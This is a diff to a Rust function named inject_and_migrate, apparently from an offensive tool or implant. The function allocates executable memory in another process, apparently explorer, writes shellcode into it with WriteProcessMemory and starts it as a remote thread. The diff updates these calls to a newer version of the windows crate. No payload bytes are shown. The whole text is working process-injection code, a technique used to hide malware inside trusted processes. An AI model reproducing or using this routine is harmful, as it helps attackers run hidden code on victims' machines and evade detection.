@@ -1,4 +1,5 @@
-use std::{mem, ptr};
+use core::ffi::c_void;
+use std::mem;
 use windows::Win32::Foundation::CHAR;
 use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
 use windows::Win32::System::Diagnostics::ToolHelp::{
@@ -62,7 +63,7 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
     let base_address = unsafe {
         VirtualAllocEx(
             explorer_handle,
-            ptr::null(),
+            None,
             shellcode.len(),
             MEM_COMMIT | MEM_RESERVE,
             PAGE_EXECUTE_READWRITE,
@@ -76,7 +77,8 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
         WriteProcessMemory(
             explorer_handle,
             base_address,
-            shellcode,
+            shellcode.as_ptr() as *const c_void,
+            shellcode.len(),
             None,
         )
     };
@@ -94,7 +96,7 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
             None,
             0,
             start_address_option,
-            ptr::null(),
+            None,
             0,
             None,
         )
